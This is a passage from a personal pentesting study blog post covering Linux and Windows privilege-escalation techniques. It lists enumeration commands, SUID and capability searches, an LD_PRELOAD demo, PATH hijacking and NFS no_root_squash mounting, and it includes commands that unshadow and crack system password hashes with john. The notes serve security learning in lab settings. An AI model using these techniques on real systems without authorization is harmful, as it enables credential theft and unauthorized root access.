  <li><code class="language-plaintext highlighter-rouge">netstat -a</code> shows all listening ports and established connections.</li>
  <li><code class="language-plaintext highlighter-rouge">netstat -at</code> or <code class="language-plaintext highlighter-rouge">netstat -au</code>, show tcp or udp</li>
  <li><code class="language-plaintext highlighter-rouge">netstat -l</code> list ports in “listening” mode</li>
  <li><code class="language-plaintext highlighter-rouge">find . -name flag1.txt</code> find file in current directory</li>
  <li><code class="language-plaintext highlighter-rouge">find /home -name flag1.txt</code> find file in home directory</li>
  <li><code class="language-plaintext highlighter-rouge">ind / -type d -name config</code> find directory in /</li>
  <li><code class="language-plaintext highlighter-rouge">find / -type f -perm 0777</code> find file with permission 777</li>
  <li><code class="language-plaintext highlighter-rouge">find / -perm a=x</code> find executable files</li>
  <li><code class="language-plaintext highlighter-rouge">find /home -user frank</code></li>
  <li><code class="language-plaintext highlighter-rouge">find / -mtime 10</code> find files modified in last 10 days.</li>
  <li><code class="language-plaintext highlighter-rouge">find / -atime 10</code> find files access in last 10 days.</li>
  <li><code class="language-plaintext highlighter-rouge">find / -cmin -60</code> find files changed in last 60 minutes.</li>
  <li><code class="language-plaintext highlighter-rouge">find / -size 50M</code> find files with size of 50m.</li>
  <li><code class="language-plaintext highlighter-rouge">find / -size +100M</code> find files larger than 100m.</li>
  <li><code class="language-plaintext highlighter-rouge">find / -size +100M -type f 2&gt;/dev/null</code> redirect errors to “/dev/null” and have a cleaner output</li>
</ul>

<p><strong>Automated Enumeration Tools</strong></p>
<ul>
  <li>LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</li>
  <li>LinEnum: https://github.com/rebootuser/LinEnum</li>
  <li>LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester</li>
  <li>Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration</li>
  <li>Linux Priv Checker: https://github.com/linted/linuxprivchecker</li>
</ul>

<p><strong>sudo</strong></p>
<ul>
  <li>https://gtfobins.github.io/</li>
  <li>find what we can do of a sudo program</li>
</ul>

<p><strong>Leverage LD_PRELOAD</strong></p>
<ul>
  <li>use <strong>LD_PRELOAD</strong> to cheat. https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/</li>
  <li>random_num.c</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span> 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
  <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">100</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">gcc random_num.c -o random_num</code></li>
  <li>unrandom.c</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">rand</span><span class="p">(){</span>
    <span class="k">return</span> <span class="mi">42</span><span class="p">;</span> <span class="c1">//the most random number in the universe</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">gcc -shared -fPIC unrandom.c -o unrandom.so</code></li>
  <li><code class="language-plaintext highlighter-rouge">LD_PRELOAD=$PWD/unrandom.so ./random_nums</code> not random, but random when <code class="language-plaintext highlighter-rouge">./random_nums</code></li>
  <li><code class="language-plaintext highlighter-rouge">export LD_PRELOAD=$PWD/unrandom.so</code> set to env, and, not random even <code class="language-plaintext highlighter-rouge">./ random_nums</code></li>
  <li><code class="language-plaintext highlighter-rouge">printenv LD_PRELOAD</code> Check environment value</li>
  <li><code class="language-plaintext highlighter-rouge">ldd random_nums</code> Check program shared objects</li>
</ul>

<p><strong>suid</strong></p>
<ul>
  <li>SUID (Set-user Identification) and SGID (Set-group Identification)</li>
  <li>allow files to be executed with the permission level of the file owner or the group owner</li>
  <li><code class="language-plaintext highlighter-rouge">find / -type f -perm -04000 -ls 2&gt;/dev/null</code></li>
  <li><code class="language-plaintext highlighter-rouge">unshadow shadow.txt passwd.txt &gt; secret.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</code></li>
</ul>

<p><strong>Capabilities</strong></p>
<ul>
  <li>https://man7.org/linux/man-pages/man7/capabilities.7.html</li>
  <li><code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code></li>
</ul>

<p><strong>cron jobs</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">cat /etc/crontab</code></li>
</ul>

<p><strong>PATH</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">echo $PATH</code></li>
  <li><code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null</code> find writable folders</li>
  <li><code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u</code></li>
  <li><code class="language-plaintext highlighter-rouge">grep -v</code> invert-match, select the non-matching lines. do not show “/proc/{ID}” lines.</li>
  <li><code class="language-plaintext highlighter-rouge">export PATH=/tmp:$PATH</code></li>
  <li>when a root program “test” with “SUID” bit set, and it calls <code class="language-plaintext highlighter-rouge">system("thm")</code>, we need to add executable “thm” to $PATH. And it can run as root after “test” executed.</li>
</ul>

<p><strong>NFS</strong></p>
<ul>
  <li>Network File Sharing.</li>
  <li>SSH, Telnet.</li>
  <li><code class="language-plaintext highlighter-rouge">cat /etc/exports</code> configurations</li>
  <li>The critical element for this privilege escalation vector is the “no_root_squash” option.</li>
  <li><code class="language-plaintext highlighter-rouge">showmount -e {targetIP}</code> on attackers`, to check the target opened path</li>
  <li><code class="language-plaintext highlighter-rouge">mkdir {attacker_path}</code></li>
  <li><code class="language-plaintext highlighter-rouge">mount -o rw {targetIP}:/{showed open path} {attacker_path}</code></li>
</ul>

<h2 id="windows-privesc"><span class="mr-2">Windows Privesc</span><a href="#windows-privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>automated enumeration script</p>
<ul>
  <li>winPEAS or PowerUp.ps1</li>
</ul>

<p>Manual checklist</p>
<ul>
  <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</li>
</ul>

<p>Vulnerable machine</p>
<ul>
  <li>https://github.com/sagishahar/lpeworkshop</li>
</ul>

<p>command:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">whoami /priv</code> Current user’s privileges</li>
  <li><code class="language-plaintext highlighter-rouge">net users</code> list users</li>
  <li><code class="language-plaintext highlighter-rouge">net user {username}</code> detail of a user</li>
  <li><code class="language-plaintext highlighter-rouge">net localgroup</code> User groups defined on the system</li>
  <li><code class="language-plaintext highlighter-rouge">net localgroup {groupname}</code> list members of a group</li>
  <li><code class="language-plaintext highlighter-rouge">systeminfo</code> show system information</li>
  <li><code class="language-plaintext highlighter-rouge">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code> grep the output</li>
</ul>

<p>search file:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">findstr /si password *.txt</code></li>
  <li>/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)</li>
</ul>

<p>list updates installed on the target system:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
  <li>Windows Management Instrumentation (WMI)</li>
</ul>

<p>Network Connections: <code class="language-plaintext highlighter-rouge">netstat -ano</code></p>

<p>Scheduled Tasks:<code class="language-plaintext highlighter-rouge">schtasks</code>, <code class="language-plaintext highlighter-rouge">schtasks /query /fo LIST /v</code></p>

<p>Drivers: <code class="language-plaintext highlighter-rouge">driverquery</code></p>

<p>Antivirus: <code class="language-plaintext highlighter-rouge">sc query windefend</code>, <code class="language-plaintext highlighter-rouge">sc queryex type=service</code></p>

<p><strong>Tools</strong>:</p>
<ul>
  <li>WinPEAS <code class="language-plaintext highlighter-rouge">winpeas.exe &gt; outputfile.txt</code> https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</li>
  <li>PowerUp https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</li>
  <li>Windows Exploit Suggester. https://github.com/AonCyberLabs/Windows-Exploit-Suggester</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">wmic product get name,version,vendor</code></p>

<p><strong>DLL Hijacking</strong></p>
<ul>
  <li>DLL search order</li>
  <li>https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order</li>
  <li>Process Monitor (ProcMon)</li>
</ul>

<h2 id="creating-the-malicious-dll-file"><span class="mr-2">Creating the malicious DLL file</span><a href="#creating-the-malicious-dll-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/sec/'>sec</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/recon/"
          class="post-tag no-text-decoration" >recon</a>
      
      <a href="/tags/idor/"
          class="post-tag no-text-decoration" >idor</a>
      
      <a href="/tags/file-inclusion/"
          class="post-tag no-text-decoration" >file-inclusion</a>
      
      <a href="/tags/ssrf/"
          class="post-tag no-text-decoration" >ssrf</a>
      
      <a href="/tags/xss/"
          class="post-tag no-text-decoration" >xss</a>
      
      <a href="/tags/injection/"
          class="post-tag no-text-decoration" >injection</a>
      
      <a href="/tags/burpsuite/"
          class="post-tag no-text-decoration" >burpsuite</a>
      
      <a href="/tags/nmap/"
          class="post-tag no-text-decoration" >nmap</a>
      
      <a href="/tags/protocal/"
          class="post-tag no-text-decoration" >protocal</a>
      
      <a href="/tags/metasploit/"
          class="post-tag no-text-decoration" >metasploit</a>
      
      <a href="/tags/msfvenom/"
          class="post-tag no-text-decoration" >msfvenom</a>
      
      <a href="/tags/meterpreter/"
          class="post-tag no-text-decoration" >meterpreter</a>
      
      <a href="/tags/reverse-shell/"
          class="post-tag no-text-decoration" >reverse-shell</a>
      
      <a href="/tags/privesc/"
          class="post-tag no-text-decoration" >privesc</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Jr+Penetrarion+Test+-+Yuchao+Toolbox&url=%2Fposts%2FJr-Penetration-Tester%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Jr+Penetrarion+Test+-+Yuchao+Toolbox&u=%2Fposts%2FJr-Penetration-Tester%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=%2Fposts%2FJr-Penetration-Tester%2F&text=Jr+Penetrarion+Test+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/htb-popcorn/">htb popcorn</a></li>
      
        
        
        
      <li><a href="/posts/htb-secret/">htb secret</a></li>
      
        
        
        
      <li><a href="/posts/Write-A-Post/">How to write a post</a></li>
      
        
        
        
      <li><a href="/posts/text-and-typography/">Text and Typography</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/htb/">htb</a>
    
      
      <a class="post-tag" href="/tags/jekyll/">jekyll</a>
    
      
      <a class="post-tag" href="/tags/assembly/">assembly</a>
    
      
      <a class="post-tag" href="/tags/aws/">aws</a>
    
      
      <a class="post-tag" href="/tags/bof/">bof</a>
    
      
      <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
    
      
      <a class="post-tag" href="/tags/dirtycow/">dirtycow</a>
    
      
      <a class="post-tag" href="/tags/file-inclusion/">file-inclusion</a>
    
      
      <a class="post-tag" href="/tags/git/">git</a>
    
      
      <a class="post-tag" href="/tags/idor/">idor</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/htb-popcorn/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago small"
    data-ts="1615779180"
    
    >
  2021-03-15
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb popcorn</h3>
            <div class="text-muted small">
              <p>
                





                Recon

nmap
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6


  OpenSSH 5.1p1, Apache httpd 2.2.12  —&amp;gt; older than Ubuntu Trusty 1...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/htb-secret/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago small"
    data-ts="1635552000"
    
    >
  2021-10-30
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb secret</h3>
            <div class="text-muted small">
              <p>
                





                nmap
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120


See 80, 3000 port run the same thing:

  maybe 80 is a reverse pro...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/BOF/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago small"
    data-ts="1648351980"
    
    >
  2022-03-27
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Buffer over flow</h3>
            <div class="text-muted small">
              <p>
                





                Learn from Video

understand stack MOST IMPORTANT !!!

What happens when you call a procedure?

  https://www.youtube.com/watch?v=RU5vUIl1vRs


Assembly Programming Assembly Function Stack Frame Ex...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/htb-secret/" class="btn btn-outline-primary"
    prompt="Older">
    <p>htb secret</p>
  </a>
  

  
  <a href="/posts/BOF/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Buffer over flow</p>
  </a>
  

</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/0xZEN2">Yuchao</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/htb/">htb</a>
    
      
      <a class="post-tag" href="/tags/jekyll/">jekyll</a>
    
      
      <a class="post-tag" href="/tags/assembly/">assembly</a>
    
      
      <a class="post-tag" href="/tags/aws/">aws</a>
    
      
      <a class="post-tag" href="/tags/bof/">bof</a>
    
      
      <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
    
      
      <a class="post-tag" href="/tags/dirtycow/">dirtycow</a>
    
      
      <a class="post-tag" href="/tags/file-inclusion/">file-inclusion</a>
    
      
      <a class="post-tag" href="/tags/git/">git</a>
    
      
      <a class="post-tag" href="/tags/idor/">idor</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>

<script>
  $(function() {
    function updateMermaid(event) {
      if (event.source === window && event.data &&
            event.data.direction === ModeToggle.ID) {

        const mode = event.data.message;

        if (typeof mermaid === "undefined") {
          return;
        }

        let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    let initTheme = "default";

    if ($("html[data-mode=dark]").length > 0
      || ($("html[data-mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener("message", updateMermaid);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

